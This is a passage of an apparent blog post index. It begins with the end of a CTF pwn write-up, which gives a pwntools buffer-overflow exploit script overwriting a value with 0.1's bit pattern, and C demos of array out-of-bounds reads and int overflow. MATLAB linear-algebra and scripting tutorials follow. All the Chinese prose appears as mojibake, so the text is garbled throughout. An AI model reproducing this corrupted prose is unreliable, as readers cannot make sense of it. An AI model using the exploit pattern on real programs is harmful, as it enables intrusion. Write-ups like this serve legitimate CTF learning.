ÊòæËÄåÊòìËßÅÔºå0.1ÊòØÁî®0x3fb999999999999aË°®Á§∫ÁöÑÔºåÈÇ£‰πàÂú®Êé•‰∏ãÊù•ÁöÑexp‰∏≠Â∞±Â∫îËØ•ËøôÊ†∑ÂÜô:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./task"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p=remote("117.78.26.114",31498)</span>payload<span class="token operator">=</span><span class="token string">""</span>payload<span class="token operator">+=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x7FFFFFFFFFFFFFFF</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3FB999999999999A</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#cmd="cat flag"</span><span class="token comment" spellcheck="true">#print p.recv()</span><span class="token comment" spellcheck="true">#print payload</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p.send(cmd)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print p.recv()</span></code></pre><p>ËøêË°åexpÔºåÊïàÊûúÂõæÔºö</p><p><img src="https://i.loli.net/2018/10/13/5bc214f6668a4.png" alt=""></p></blockquote><h2 id="È™åËØÅÊï∞ÁªÑË∂äÁïå"><a href="#È™åËØÅÊï∞ÁªÑË∂äÁïå" class="headerlink" title="È™åËØÅÊï∞ÁªÑË∂äÁïå"></a>È™åËØÅÊï∞ÁªÑË∂äÁïå</h2><blockquote><p>‚Äã    ÂÜô‰∏ÄÊÆµÁÆÄÂçïÁöÑ‰ª£Á†ÅÊù•È™åËØÅ‰∏Ä‰∏ãÔºåÊñ∞ÁîüÁªèÂ∏∏‰ºöÁäØÈîôÁöÑÊï∞ÁªÑË∂äÁïåÈóÆÈ¢ò</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>‚Äã    ËøêË°åÁªìÊûúÔºö</p><p><img src="https://i.loli.net/2018/10/14/5bc299e356904.png" alt=""></p><p>‚Äã    Âõ†‰∏∫a[4]Âπ∂‰∏çÂú®Êàë‰ª¨ÂÆö‰πâÁöÑÊï∞ÁªÑËåÉÂõ¥ÔºåÂ±û‰∫éÊï∞ÁªÑË∂äÁïåÔºåÊé•‰∏ãÊù•Ë∞ÉËØï‰∏Ä‰∏ãÁúãÁúãÂÖ∑‰ΩìÊÉÖÂÜµÔºö</p><p><img src="https://i.loli.net/2018/10/14/5bc2998608bee.png" alt=""></p><p>‚Äã    ËÄåÂ∞±Âú®0Ôºå1Ôºå2Ôºå3ÂêéÈù¢ÊòØ‰∏çÊòØÊàë‰ª¨ËøêË°åËæìÂá∫ÁöÑÈÇ£‰∏™ÂÄºÂë¢ÔºüÊ≠£ÊòØÂ¶ÇÊ≠§ÔºåÂõ†‰∏∫Êàë‰ª¨ÈÄöËøáa[4]ËÆøÈóÆÁöÑÂπ∂‰∏çÊòØÊàë‰ª¨ÊõæÁªèÂÆö‰πâËøáÁöÑÂÖÉÁ¥†ÔºåËÄåÊòØÁ®ãÂ∫èËøêË°å‰∏≠ÁöÑ‰∫ßÁîüÁöÑÈöèÊú∫ÂÄºÔºåÂ¶ÇÂáΩÊï∞Âú∞ÂùÄÁ≠â„ÄÇ</p></blockquote><h2 id="È™åËØÅintÊ∫¢Âá∫"><a href="#È™åËØÅintÊ∫¢Âá∫" class="headerlink" title="È™åËØÅintÊ∫¢Âá∫"></a>È™åËØÅintÊ∫¢Âá∫</h2><blockquote><p>‚Äã    Âú®64‰ΩçÁ≥ªÁªü‰∏≠ <code>int</code>ÂûãÂèòÈáèÊòØÂç†Áî®4‰∏™Â≠óËäÇÂ§ßÂ∞èÁöÑÔºåËÄå4‰∏™Â≠óËäÇÁî®16ËøõÂà∂Ë°®Á§∫Â∞±ÊòØ<code>0x00000000-0xffffffff</code>ÔºåÂπ∂‰∏îÊ≠£Êï∞Ë¥üÊï∞ÈÉΩÂú®ÂÖ∂‰∏≠ÔºåËÄåË¥üÊï∞ÊòØÁî®Ë°•Á†ÅË°®Á§∫ÁöÑÔºå<code>0x7fffffff&lt;=&gt;2147483647</code>Ôºå<code>0x80000000=2147483648&lt;=&gt;-2147483648</code>„ÄÇ</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Âõõ‰∏™Â≠óËäÇÊúÄÂ§ßÂÄº0x7fffffffÂçÅËøõÂà∂‰∏∫:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token number">0x7fffffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ËØ∑ËæìÂÖ•‰Ω†ÊÉ≥Ë¶ÅËµãÁªôintÁöÑÂÄº:\n"</span><span class="token punctuation">)</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ËøêË°åÁªìÊûúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc29c77aa16d.png" class="lazyload"></p><p>‚Äã    Êûú‰∏çÂÖ∂ÁÑ∂ÔºåÊàë‰ª¨ËµãÁªôintÁöÑ2147483648ÂèòÊàê‰∫ÜË¥üÊï∞Ôºå-2147483648„ÄÇ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc29d54a35a3.png" class="lazyload"></p></blockquote><blockquote><p>have a good weekend everybody!</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ‰∫åËøõÂà∂ÂÆâÂÖ® </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Êï∞Â≠¶Âª∫Ê®°-day5</title>
      <link href="/2018/10/13/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day5/"/>
      <url>/2018/10/13/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day5/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Êï∞Â≠¶Âª∫Ê®°-day5-Á∫øÊÄß‰ª£Êï∞"><a href="#Êï∞Â≠¶Âª∫Ê®°-day5-Á∫øÊÄß‰ª£Êï∞" class="headerlink" title="Êï∞Â≠¶Âª∫Ê®°_day5 - Á∫øÊÄß‰ª£Êï∞"></a>Êï∞Â≠¶Âª∫Ê®°_day5 - Á∫øÊÄß‰ª£Êï∞</h1><blockquote><p>‚Äã    Á∫øÊÄß‰ª£Êï∞Áõ∏‰ø°Â§ßÂÆ∂ÈÉΩÂ≠¶ËøáÂìíÔºåÂü∫Êú¨ÊòØÂ§ßÂ≠¶ÁöÑÁêÜÁßëÂøÖ‰øÆËØæÔºåËÄåÁ∫øÊÄß‰ª£Êï∞Â∏∏Áî®‰∫éÂ∑•Á®ãÊï∞Â≠¶ÔºåËá™ÁÑ∂ËÄåÁÑ∂Â∞±ÂíåÊï∞Â≠¶Âª∫Ê®°ÊúâÂæàÂ§ßÁöÑÂÖ≥Á≥ªÂï¶Ôºå‰ªäÂ§©Â≠¶‰π†‰∏Ä‰∏ãÁî®matlabÂÅö‰∏Ä‰∫õÁõ∏ÂÖ≥ÁöÑÁ∫øÊÄß‰ª£Êï∞Â≠¶‰π†„ÄÇ</p></blockquote><h2 id="Áü©Èòµ"><a href="#Áü©Èòµ" class="headerlink" title="Áü©Èòµ"></a>Áü©Èòµ</h2><blockquote><p>‚Äã    MATLAB Êèê‰æõ‰∫ÜËÆ∏Â§öÂáΩÊï∞ÔºåÁî®‰∫éÂàõÂª∫ÂêÑÁßçÁ±ªÂûãÁöÑÁü©Èòµ„ÄÇ‰æãÂ¶ÇÔºå‰Ω†Â∞±ÂèØ‰ª•‰ΩøÁî®Âü∫‰∫éÂ∏ïÊñØÂç°‰∏âËßíÂΩ¢ÁöÑÈ°πÂàõÂª∫‰∏Ä‰∏™ÂØπÁß∞Áü©ÈòµÔºö </p></blockquote><pre class=" language-matlab"><code class="language-matlab">A <span class="token operator">=</span> <span class="token function">pascal</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#ËôöÁ∫ø‰∏ã‰∏∫ËøêË°åÁªìÊûúA <span class="token operator">=</span>       <span class="token number">1</span>     <span class="token number">1</span>     <span class="token number">1</span>       <span class="token number">1</span>     <span class="token number">2</span>     <span class="token number">3</span>       <span class="token number">1</span>     <span class="token number">3</span>     <span class="token number">6</span></code></pre><blockquote><p>Êàë‰ª¨‰πüÂèØ‰ª•ÂàõÂª∫‰∏Ä‰∏™ÈùûÂØπÁß∞<em>ÂπªÊñπÁü©Èòµ</em>ÔºåÂÆÉÁöÑË°åÊÄªÂíå‰∏éÂàóÊÄªÂíåÁõ∏Á≠âÔºö </p></blockquote><pre class=" language-matlab"><code class="language-matlab">B <span class="token operator">=</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#ËôöÁ∫ø‰∏ã‰∏∫ËøêË°åÁªìÊûúB <span class="token operator">=</span>       <span class="token number">8</span>     <span class="token number">1</span>     <span class="token number">6</span>       <span class="token number">3</span>     <span class="token number">5</span>     <span class="token number">7</span>       <span class="token number">4</span>     <span class="token number">9</span>     <span class="token number">2</span></code></pre><blockquote><p>‚Äã    ËøôÈáåÊàë‰ª¨Â≠¶‰π†‰∏Ä‰∏ã<code>randi()</code>ÂáΩÊï∞ÔºårandiÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÂèØ‰ª•Áî®‰∫éÊèèËø∞‰∫ßÁîüÁü©ÈòµÁöÑÊï∞ÂÄºËåÉÂõ¥ÔºåÂêéÈù¢ÁöÑ‰∏§‰∏™ÂèÇÊï∞ÊòØË°åÂàóÊï∞Ôºå‰æãÂ¶ÇÔºö</p></blockquote><pre class=" language-matlab"><code class="language-matlab">a <span class="token operator">=</span> <span class="token function">randi</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#ËôöÁ∫ø‰∏ã‰∏∫ËøêË°åÁªìÊûúa <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">13</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">9</span>    <span class="token number">19</span>     <span class="token number">2</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">19</span>     <span class="token number">3</span>     <span class="token number">6</span>     <span class="token number">4</span>    <span class="token number">17</span>    <span class="token number">16</span>    <span class="token number">19</span>    <span class="token number">11</span>    <span class="token number">20</span>     <span class="token number">3</span>    <span class="token number">20</span></code></pre><h2 id="Áü©ÈòµÁöÑËΩ¨ÁΩÆ"><a href="#Áü©ÈòµÁöÑËΩ¨ÁΩÆ" class="headerlink" title="Áü©ÈòµÁöÑËΩ¨ÁΩÆ"></a>Áü©ÈòµÁöÑËΩ¨ÁΩÆ</h2><blockquote><p>‚Äã    Êàë‰ª¨Áü•ÈÅìÁü©ÈòµÊúâÂÆûÊï∞Áü©ÈòµÂíåÂ§çÊï∞Áü©Èòµ‰∏§ÁßçÔºåÂØπ‰∫éÂÆûÁü©ÈòµÔºå<em>ËΩ¨ÁΩÆ</em>ËøêÁÆóÂØπ aij Âíå aji ËøõË°å‰∫§Êç¢„ÄÇÂØπ‰∫éÂ§çÁü©ÈòµÔºåËøòË¶ÅËÄÉËôëÊòØÂê¶Áî®Êï∞ÁªÑ‰∏≠Â§çÊï∞È°πÁöÑÂ§çÂÖ±ËΩ≠Êù•ÂΩ¢Êàê<em>Â§çÂÖ±ËΩ≠ËΩ¨ÁΩÆ</em>„ÄÇMATLAB ‰ΩøÁî®ÊíáÂè∑ËøêÁÆóÁ¨¶ (<code>&#39;</code>) ÊâßË°åÂ§çÂÖ±ËΩ≠ËΩ¨ÁΩÆÔºå‰ΩøÁî®ÁÇπÊíáÂè∑ËøêÁÆóÁ¨¶ (<code>.&#39;</code>) ÊâßË°åÊó†ÂÖ±ËΩ≠ÁöÑËΩ¨ÁΩÆ„ÄÇÂØπ‰∫éÂåÖÂê´ÊâÄÊúâÂÆûÊï∞ÂÖÉÁ¥†ÁöÑÁü©ÈòµÔºåËøô‰∏§‰∏™ËøêÁÆóÁ¨¶ËøîÂõûÁõ∏ÂêåÁªìÊûú„ÄÇ </p><p>ÂÆûÁü©ÈòµËΩ¨ÁΩÆÁ§∫‰æãÔºö</p></blockquote><pre class=" language-matlab"><code class="language-matlab">#ËøôÈáåÊãø‰∏ä‰∏ÄÊ≠•ÁöÑaÂÄºÂÅöÊµãËØïa<span class="token operator">'</span>ans <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">19</span>     <span class="token number">3</span>    <span class="token number">19</span>    <span class="token number">13</span>     <span class="token number">2</span>     <span class="token number">6</span>    <span class="token number">11</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">4</span>    <span class="token number">20</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">17</span>     <span class="token number">3</span>     <span class="token number">9</span>    <span class="token number">19</span>    <span class="token number">16</span>    <span class="token number">20</span>#‰∫ãÂÆûËØÅÊòéÂÆûÁü©Èòµ a<span class="token operator">'</span>Âíåa<span class="token operator">.'</span>Êìç‰ΩúÊòØ‰∏ÄÊ†∑ÁöÑÁªìÊûú     a<span class="token operator">.'</span>ans <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">19</span>     <span class="token number">3</span>    <span class="token number">19</span>    <span class="token number">13</span>     <span class="token number">2</span>     <span class="token number">6</span>    <span class="token number">11</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">4</span>    <span class="token number">20</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">17</span>     <span class="token number">3</span>     <span class="token number">9</span>    <span class="token number">19</span>    <span class="token number">16</span>    <span class="token number">20</span></code></pre><blockquote><p>ÂÆö‰πâÂ§çÊï∞Áü©ÈòµÂπ∂ËøõË°åËΩ¨ÁΩÆ:</p></blockquote><pre class=" language-matlab"><code class="language-matlab">z <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">2i</span> <span class="token number">3</span><span class="token operator">+</span><span class="token number">2i</span> <span class="token number">5</span><span class="token operator">+</span><span class="token number">i</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">i</span> <span class="token number">9</span><span class="token operator">+</span><span class="token number">i</span> <span class="token number">4</span><span class="token operator">+</span><span class="token number">5i</span><span class="token punctuation">]</span>z <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">+</span> <span class="token number">5.0000i</span>#z ÁöÑÂÖ±ËΩ≠ËΩ¨ÁΩÆ‰∏∫Ôºöz<span class="token operator">'</span>ans <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">-</span> <span class="token number">2.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">-</span> <span class="token number">2.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">-</span> <span class="token number">5.0000i</span>#z ÁöÑÈùûÂÖ±ËΩ≠ËΩ¨ÁΩÆz<span class="token operator">.'</span>ans <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">+</span> <span class="token number">5.0000i</span></code></pre><h2 id="Áü©ÈòµÁöÑ‰πòÁßØ"><a href="#Áü©ÈòµÁöÑ‰πòÁßØ" class="headerlink" title="Áü©ÈòµÁöÑ‰πòÁßØ"></a>Áü©ÈòµÁöÑ‰πòÁßØ</h2><blockquote><p>‚Äã    ‰πãÂâçÂ≠¶‰π†Á∫øÊÄß‰ª£Êï∞ÁöÑÊó∂ÂÄôÔºåËÆ°ÁÆóÁü©ÈòµÁöÑ‰πòÁßØÈÉΩÊòØÊåâÂÖ¨ÂºèÊù•ÁÆóÔºåÁé∞Âú®ÂèØ‰ª•ÈÄöËøámatlab forÂæ™ÁéØÊù•ÂÆûÁé∞Ëøô‰∏™ËÆ°ÁÆóÔºö</p></blockquote><pre class=" language-matlab"><code class="language-matlab">A <span class="token operator">=</span> <span class="token function">pascal</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>B <span class="token operator">=</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> n <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>m     <span class="token keyword">for</span> <span class="token number">j</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>n        <span class="token function">C</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">B</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">end</span><span class="token keyword">end</span></code></pre><blockquote><p>‚Äã    ÊåâÁü©Èòµ‰πòÊ≥ïËßÑÂàôÔºåÁü©ÈòµÂèØ‰ª•Âú®ÂÖ∂Âè≥‰æß‰πò‰ª•ÂàóÂêëÈáèÔºåÂú®Â∑¶‰æß‰πò‰ª•Ë°åÂêëÈáè„ÄÇ</p></blockquote><blockquote><p>‚Äã    Êé•‰∏ãÊù•ÁªìÂêàÂÖ∑‰ΩìÊï∞Â≠¶ÂÆû‰æãÔºåÊù•ËøõË°åÊõ¥Ê∑±ÂÖ•ÁöÑÁªºÂêàÊÄßÂ≠¶‰π†„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Êï∞Â≠¶Âª∫Ê®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Êï∞Ê®° </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Êï∞Â≠¶Âª∫Ê®°-day4</title>
      <link href="/2018/10/09/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day4/"/>
      <url>/2018/10/09/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day4/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Êï∞Â≠¶Âª∫Ê®°-day4-matlabÁºñÁ®ãÂíåËÑöÊú¨"><a href="#Êï∞Â≠¶Âª∫Ê®°-day4-matlabÁºñÁ®ãÂíåËÑöÊú¨" class="headerlink" title="Êï∞Â≠¶Âª∫Ê®°_day4 - matlabÁºñÁ®ãÂíåËÑöÊú¨"></a>Êï∞Â≠¶Âª∫Ê®°_day4 - matlabÁºñÁ®ãÂíåËÑöÊú¨</h1><h2 id="ÂàõÂª∫‰∏éËøêË°åËÑöÊú¨"><a href="#ÂàõÂª∫‰∏éËøêË°åËÑöÊú¨" class="headerlink" title="ÂàõÂª∫‰∏éËøêË°åËÑöÊú¨"></a>ÂàõÂª∫‰∏éËøêË°åËÑöÊú¨</h2><blockquote><p>‚Äã    <em>ËÑöÊú¨</em>ÊòØÊúÄÁÆÄÂçïÁöÑ‰∏ÄÁßç MATLAB¬Æ Á®ãÂ∫è„ÄÇËÑöÊú¨ÊòØ‰∏Ä‰∏™ÂåÖÂê´Â§öË°åËøûÁª≠ MATLAB ÂëΩ‰ª§ÂíåÂáΩÊï∞Ë∞ÉÁî®ÁöÑÊâ©Â±ïÂêç‰∏∫ <code>.m</code> ÁöÑÊñá‰ª∂„ÄÇÂú®ÂëΩ‰ª§Ë°å‰∏≠ÈîÆÂÖ•ËÑöÊú¨ÂêçÁß∞Âç≥ÂèØËøêË°åËØ•ËÑöÊú¨„ÄÇ </p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; Ë¶ÅÂàõÂª∫ËÑöÊú¨ÔºåÂèØ‰ª•‰ΩøÁî® <code>edit &quot;filename&quot;</code></p><pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">% Ëøô‰ºöÊâìÂºÄ‰∏Ä‰∏™Âêç‰∏∫ "filename".m ÁöÑÁ©∫ÁôΩÊñá‰ª∂„ÄÇËæìÂÖ•‰∏Ä‰∫õÁªòÂà∂ÈöèÊú∫Êï∞ÊçÆÁöÑÂêëÈáèÁöÑ‰ª£Á†ÅÔºö</span>n <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>r <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">plot</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment" spellcheck="true">% mean ÂáΩÊï∞Ê±ÇÂùáÂÄºÔºåÂØπÁîüÊàêÁöÑ50‰∏™ÂÄºÊ±ÇÂπ≥Âùá</span><span class="token comment" spellcheck="true">% mean(r,1)Ë°®Á§∫ÂØπÊØèÂàóÊ±ÇÂπ≥Âùá</span><span class="token comment" spellcheck="true">% mean(r,2)Ë°®Á§∫ÂØπÊØèË°åÊ±ÇÂπ≥Âùá</span><span class="token comment" spellcheck="true">% Draw a line from (0,m) to (n,m)</span>m <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">% hold on ÊòØÂΩìÂâçËΩ¥ÂèäÂõæÂÉè‰øùÊåÅËÄå‰∏çË¢´Âà∑Êñ∞ÔºåÂáÜÂ§áÊé•ÂèóÊ≠§ÂêéÂ∞ÜÁªòÂà∂ÁöÑÂõæÂΩ¢ÔºåÂ§öÂõæÂÖ±Â≠ò</span>hold on<span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>m<span class="token punctuation">,</span>m<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">% hold off ÊòØÂΩìÂâçËΩ¥ÂèäÂõæÂÉè‰∏çÂÜçÂÖ∑Â§áË¢´Âà∑Êñ∞ÁöÑÊÄßË¥®ÔºåÊñ∞ÂõæÂá∫Áé∞Êó∂ÔºåÂèñÊ∂àÂéüÂõæ„ÄÇÂç≥ÔºåÂÖ≥Èó≠ÂõæÂΩ¢‰øùÊåÅÂäüËÉΩ</span>hold off<span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Mean of Random Uniform Data'</span><span class="token punctuation">)</span></code></pre><blockquote><p>ÊàêÂìÅÂõæÂ¶Ç‰∏ãÔºö</p></blockquote><div align="center"><br><br><img src="https://i.loli.net/2018/10/10/5bbdfdf74ac32.png" alt=""><br><br></div><blockquote><p>‰øùÂ≠òÊñá‰ª∂ÂêéÂèØ‰ª•ÈÄöËøáÂè≥ÈîÆËøêË°åÔºå‰πüÂèØÁõ¥Êé•ËæìÂÖ•Êñá‰ª∂ÂêçËøêË°å„ÄÇ</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe0157d413b.png" alt=""><br><br></div><h2 id="for-Âæ™ÁéØ"><a href="#for-Âæ™ÁéØ" class="headerlink" title="for Âæ™ÁéØ"></a>for 